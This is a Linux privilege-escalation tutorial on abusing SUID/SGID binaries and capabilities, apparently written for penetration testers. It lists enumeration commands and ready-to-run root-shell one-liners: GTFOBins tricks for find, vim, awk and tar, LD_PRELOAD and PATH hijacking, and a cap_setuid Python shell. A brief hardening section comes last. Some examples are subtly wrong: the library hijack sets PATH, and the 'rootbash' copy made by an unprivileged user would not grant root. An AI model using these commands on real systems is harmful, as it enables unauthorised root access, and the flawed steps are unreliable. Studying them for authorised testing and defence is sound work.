## SUID/SGID Binaries for Privilege Escalation

SUID (Set User ID) and SGID (Set Group ID) are special Unix/Linux permissions that allow a binary to execute with the privileges of its **owner** (SUID) or **group** (SGID), rather than the user running it. This is necessary for legitimate operations (e.g., `passwd` needs root to update `/etc/shadow`), but misconfigurations or vulnerabilities in these binaries are a classic privilege escalation vector.

---

### 1. Understanding SUID/SGID

- **SUID Bit**: When set on an executable, it runs with the **owner's** privileges. If owned by root, it runs as root.
  - Permission display: `-rwsr-xr-x` (the `s` replaces the owner's `x`)
- **SGID Bit**: When set on an executable, it runs with the **group's** privileges.
  - Permission display: `-rwxr-sr-x` (the `s` replaces the group's `x`)

**Key Distinction from Sudo**: While sudo is configured per-user via `/etc/sudoers`, SUID/SGID binaries are **system-wide** — any user on the system can execute them with elevated privileges if the file permissions allow it.

---

### 2. Enumeration: Finding SUID/SGID Binaries

**Primary Commands**:

```bash
# Find all SUID binaries (owned by root)
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# More comprehensive search
find / -user root -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

**Legacy Method** (older systems):
```bash
find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -al {} \; 2>/dev/null
```

---

### 3. Exploitation Strategies

#### A. Known Vulnerable Binaries (GTFOBins)

Many common binaries have built-in functions that can spawn shells when run with SUID privileges. Reference **GTFOBins** for the exact exploit syntax.

**Common Examples**:

| Binary | Exploit Command |
|--------|-----------------|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` / `vi` | `vim -c ':!/bin/sh'` |
| `nano` | `nano` → `^R^X` → `reset; sh 1>&0 2>&0` |
| `less` / `more` | `less /etc/profile` → `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `cp` | Copy `/etc/shadow` or `/etc/sudoers` to writable location |
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |

**Note**: The `-p` flag in `sh -p` preserves the SUID privileges; without it, some shells drop privileges.

---

#### B. Shared Object Hijacking (LD_PRELOAD / LD_LIBRARY_PATH)

If a SUID binary loads a shared library from a **relative path** or **user-writable directory**, an attacker can replace or preload a malicious library.

**LD_PRELOAD Exploit**:
```bash
# Create malicious shared library
echo 'int getuid() { return 0; }' > exploit.c
gcc -shared -fPIC exploit.c -o exploit.so

# Run SUID binary with LD_PRELOAD (if allowed)
LD_PRELOAD=./exploit.so /path/to/suid/binary
```

**Library Path Hijack**:
```bash
# If binary loads libxyz.so from ./lib/
mkdir lib
gcc -shared -fPIC -o lib/libxyz.so malicious.c
PATH=.:$PATH /path/to/suid/binary
```

**Mitigation**: Modern SUID binaries ignore `LD_PRELOAD` and `LD_LIBRARY_PATH` for security.

---

#### C. Environment Variable Exploits

Some SUID binaries use environment variables in unsafe ways:

- **PATH Hijacking**: If a SUID binary calls a command without using absolute paths (e.g., `system("ls")` instead of `/bin/ls`), an attacker can modify the `PATH` to point to a malicious binary:

  ```bash
  export PATH=/tmp:$PATH
  echo '/bin/sh' > /tmp/ls
  chmod +x /tmp/ls
  /usr/bin/suid-binary   # Now executes /tmp/ls as root
  ```

- **IFS Exploitation**: The `IFS` (Internal Field Separator) variable can be exploited in shell scripts with SUID:
  ```bash
  export IFS='/' ; /path/to/suid/script
  ```

---

#### D. Buffer Overflows & Memory Corruption

Historically, many SUID binaries have had memory corruption vulnerabilities. While patched on modern systems, legacy systems may still be vulnerable.

**Modern Example - CVE-2021-3156**: A heap-based buffer overflow in `sudo`, a setuid-root binary, allowed local users to escalate to root on vulnerable versions. The bug was fixed in sudo 1.9.5p2. Patch level matters: a setuid binary is only a lead until you confirm the installed version is vulnerable.

---

#### E. Weak File Permissions (Writable SUID Binaries)

Sometimes an SUID binary is **world-writable**:

```bash
# Check for writable SUID binaries
find / -perm -4000 -perm -o+w -type f 2>/dev/null
```

If found, an attacker can:
1. Overwrite the binary with a custom malicious executable
2. Set the SUID bit on the new binary
3. Execute it to get root

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p  # -p preserves privileges
```

---

#### F. Capability Leaks (POSIX Capabilities)

Modern Linux uses **capabilities** instead of full SUID root. Misconfigured capabilities can be equally dangerous.

**Check capabilities**:
```bash
getcap -r / 2>/dev/null
```

**Dangerous Capabilities**:
- `cap_setuid+ep`: Can change UID to root
- `cap_sys_admin+ep`: Can mount filesystems, etc.
- `cap_dac_override+ep`: Can bypass file permissions

**Example Exploit**:
```bash
# Python with cap_setuid capability
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

### 4. Automated Enumeration Tools

Several scripts automate the discovery of misconfigured SUID/SGID binaries:

- **LinPEAS** - Comprehensive Linux privilege escalation checker
- **LinEnum** - Lightweight enumeration script
- **GTFOBins** - Web-based reference for binary exploitation
- **SUID3NUM** - Dedicated SUID enumeration tool

**LinPEAS SUID check snippet**:
```bash
./linpeas.sh | grep -i "suid"
```

---

### 5. Defensive Measures

**For System Administrators**:
- **Minimize SUID Binaries**: Remove SUID bits from unnecessary binaries (`chmod u-s /path/to/binary`)
- **Use Capabilities**: Replace SUID with fine-grained `setcap` where possible
- **Regular Audits**: Periodically scan for new SUID binaries
- **Mount Options**: Use `nosuid` on partitions like `/tmp` and `/home`
- **SELinux/AppArmor**: Use MAC systems to restrict SUID binary behavior
- **Monitor Logs**: Watch for unusual SUID binary executions
